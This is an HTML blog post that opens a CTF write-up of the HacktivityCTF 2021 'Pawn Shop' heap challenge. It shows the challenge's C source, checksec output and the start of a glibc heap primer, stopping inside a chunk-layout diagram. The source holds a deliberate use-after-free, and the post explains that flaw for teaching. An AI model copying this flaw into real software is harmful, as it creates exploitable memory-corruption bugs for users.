<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>HacktivityCTF 2021 pawn shop challenge writeup</title>
	
	<meta name="author" content="stdnoerr">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="/assets/css/style.css" rel="stylesheet">

	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/stdnoerr">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/stdnoerr">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:stdnoerr@gmail.com">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c?s=35" class="img-circle" />
				stdnoerr's blog
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<li><a href="/categories.html">Categories</a></li>
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs" style="background: url(/assets/media/cover.jpg) no-repeat !important;">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c?s=150" class="img-circle" />
	</a>
	<h3 class="title">
        <a href="/">stdnoerr's blog</a>
    </h3>
</header>


<div id="bio" class="text-center">
	CTFer | pwner | wanna learn everything
</div>


<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/stdnoerr">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/stdnoerr">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:stdnoerr@gmail.com">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>HacktivityCTF 2021 pawn shop challenge writeup </h1>
</div>
	
<article>

	<div class="col-sm-10">
	 <span class="post-date">
	   
	   September 
	   28th,
	   
	   2021
	 </span>
	  <div class="article_body">
	  <p>This is writeup for <code class="language-plaintext highlighter-rouge">Pawn Shop</code> challenge from HacktivityCTF 2021. This challenge is good for getting started with heap exploitation and similar/identical challenge are commonly seen in CTFs. You can download the challenge files <a href="https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/heap/pawn_shop_hacktivity2021">here</a>.</p>

<h1 id="analysis">Analysis</h1>
<h2 id="source-code-analysis">Source Code Analysis</h2>
<p>Source code was not avaible during the CTF, but for the purpose of this writeup, I asked the author to give me the source code. Below is the source code: -</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span class="cp">#define ITEM_LIST_SIZE 10
#define BUF_LEN 8
</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="kt">double</span> <span class="n">price</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">padding</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">item_name_size</span><span class="p">;</span>
<span class="p">}</span> <span class="n">item_entry_t</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">print_items</span><span class="p">(</span><span class="n">item_entry_t</span> <span class="o">*</span><span class="n">items</span><span class="p">[</span><span class="n">ITEM_LIST_SIZE</span><span class="p">]);</span>

<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">sell_item</span><span class="p">(</span><span class="n">item_entry_t</span> <span class="o">*</span><span class="n">items</span><span class="p">[</span><span class="n">ITEM_LIST_SIZE</span><span class="p">])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="n">ITEM_LIST_SIZE</span><span class="p">;</span> <span class="n">idx</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">idx</span> <span class="o">==</span> <span class="n">ITEM_LIST_SIZE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Shop is full. Please come back again later.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">item_entry_t</span><span class="p">));</span> <span class="c1">// 0x20</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Failed to add item.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter item price: "</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">" %lf"</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">price</span><span class="p">));</span>
    <span class="n">getchar</span><span class="p">();</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter length of the item name: "</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">" %d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">item_name_size</span><span class="p">));</span>
    <span class="n">getchar</span><span class="p">();</span>

    <span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">item_name_size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">free</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
        <span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Failed to add item.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the name of the item: "</span><span class="p">);</span>

    <span class="n">fgets</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">item_name_size</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"Item added.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">item_entry_t</span> <span class="o">*</span><span class="n">items</span><span class="p">[</span><span class="n">ITEM_LIST_SIZE</span><span class="p">])</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUF_LEN</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">choice</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">item_num</span><span class="p">;</span>

    <span class="n">item_num</span> <span class="o">=</span> <span class="n">print_items</span><span class="p">(</span><span class="n">items</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">item_num</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"What item would you like to buy?: "</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">BUF_LEN</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>

    <span class="n">choice</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">choice</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="n">ITEM_LIST_SIZE</span> <span class="o">||</span> <span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid option.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">free</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]);</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"Item bought.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">print_items</span><span class="p">(</span><span class="n">item_entry_t</span> <span class="o">*</span><span class="n">items</span><span class="p">[</span><span class="n">ITEM_LIST_SIZE</span><span class="p">])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">print_num</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ITEM_LIST_SIZE</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"%d. Price $%lf, Name: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                <span class="n">print_num</span><span class="p">,</span> <span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">price</span><span class="p">,</span> <span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>

        <span class="n">print_num</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">print_num</span><span class="o">--</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">print_num</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"No items for sale.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">print_num</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">manage_items</span><span class="p">(</span><span class="n">item_entry_t</span> <span class="o">*</span><span class="n">items</span><span class="p">[</span><span class="n">ITEM_LIST_SIZE</span><span class="p">])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">item_num</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">choice</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">item_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUF_LEN</span><span class="p">];</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"WARNING! Admin use only!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">item_num</span> <span class="o">=</span> <span class="n">print_items</span><span class="p">(</span><span class="n">items</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"What item would you like to change?: "</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">BUF_LEN</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>

    <span class="n">choice</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">choice</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="n">ITEM_LIST_SIZE</span> <span class="o">||</span> <span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid option.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">])</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the new item price: "</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">" %lf"</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">price</span><span class="p">));</span>
        <span class="n">getchar</span><span class="p">();</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the new item name length: "</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">" %d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">item_len</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid item name length.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">getchar</span><span class="p">();</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">item_len</span> <span class="o">!=</span> <span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">item_name_size</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">item_name_size</span> <span class="o">=</span> <span class="n">item_len</span><span class="p">;</span>
            <span class="n">free</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
            <span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

            <span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">item_name_size</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"Failed to resize item name.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the new name of the item: "</span><span class="p">);</span>

            <span class="n">fgets</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">item_name_size</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
            <span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the new name of the item: "</span><span class="p">);</span>

            <span class="n">fgets</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">item_name_size</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
            <span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">items</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>

    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid item.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"Item changed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">item_entry_t</span> <span class="o">*</span><span class="n">items</span><span class="p">[</span><span class="n">ITEM_LIST_SIZE</span><span class="p">];</span>
    <span class="kt">_Bool</span> <span class="n">cont</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">input</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">items</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">items</span><span class="p">));</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"Welcome to the Pawn Shop!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">cont</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"[B]uy item."</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"[S]ell item."</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"[L]eave shop."</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"[P]rint items for sale."</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>

        <span class="n">scanf</span><span class="p">(</span><span class="s">" %c"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
        <span class="n">getchar</span><span class="p">();</span>

        <span class="n">input</span> <span class="o">-=</span> <span class="p">(</span><span class="n">input</span> <span class="o">&gt;=</span> <span class="sc">'a'</span><span class="p">)</span> <span class="o">?</span> <span class="mi">32</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>

        <span class="k">switch</span> <span class="p">(</span><span class="n">input</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="sc">'B'</span><span class="p">:</span>
                <span class="n">buy_item</span><span class="p">(</span><span class="n">items</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>

            <span class="k">case</span> <span class="sc">'S'</span><span class="p">:</span>
                <span class="n">sell_item</span><span class="p">(</span><span class="n">items</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>

            <span class="k">case</span> <span class="sc">'L'</span><span class="p">:</span>
                <span class="n">cont</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>

            <span class="k">case</span> <span class="sc">'M'</span><span class="p">:</span>
                <span class="n">manage_items</span><span class="p">(</span><span class="n">items</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>

            <span class="k">case</span> <span class="sc">'P'</span><span class="p">:</span>
                <span class="n">print_items</span><span class="p">(</span><span class="n">items</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>

            <span class="nl">default:</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid option."</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">input</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"Thank you for shopping at the Pawn Shop! Hope to see you again soon."</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The program presents us with a menu for managing a list of items. Each item has a structure named <code class="language-plaintext highlighter-rouge">item_entry_t</code>. Each item has <code class="language-plaintext highlighter-rouge">price</code>, <code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">item_name_size</code> and <code class="language-plaintext highlighter-rouge">padding</code>. We can add item using <code class="language-plaintext highlighter-rouge">sell_item</code>, remove item using <code class="language-plaintext highlighter-rouge">buy_item</code>, view items using <code class="language-plaintext highlighter-rouge">print_items</code> and edit item using <code class="language-plaintext highlighter-rouge">manage_items</code> functions respectively, <code class="language-plaintext highlighter-rouge">manage_items</code> option is not in the menu. If you look closely, the pointer to item is not nulled out when an item is freed. Hence, a use-after-free (UAF) vulnerability, because the program will continue to use the pointer after it is freed.</p>

<h2 id="checksec">Checksec</h2>
<p>Typically, in heap challenges, all protections are enabled. But, still, checking is good practice.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
</code></pre></div></div>

<h1 id="background-knowledge">Background Knowledge</h1>
<p>Lets learn a bit about the heap internals before diving into its exploitation. I will only explain things required to understand this writeup. This explanation is about glibc heap which uses ptmalloc2.</p>

<h2 id="what-is-a-chunk">What is a chunk?</h2>
<p>In ptmalloc2 terminology, a chunk is the memory area in heap which is used to serve a <code class="language-plaintext highlighter-rouge">malloc</code> call.<br />
They have the following structure:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">malloc_chunk</span> <span class="p">{</span>

  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">mchunk_prev_size</span><span class="p">;</span>  <span class="cm">/* Size of previous chunk (if free).  */</span>
  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">mchunk_size</span><span class="p">;</span>       <span class="cm">/* Size in bytes, including overhead. */</span>

  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>         <span class="cm">/* double links -- used only if free. */</span>
  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>

  <span class="cm">/* Only used for large blocks: pointer to next larger size.  */</span>
  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd_nextsize</span><span class="p">;</span> <span class="cm">/* double links -- used only if free. */</span>
  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk_nextsize</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>
<p>A chunk has following structure in memory when it is returned to user: -</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk   (if freed)               |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                           |
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (size of this area varies)                        .
            .                                                               |
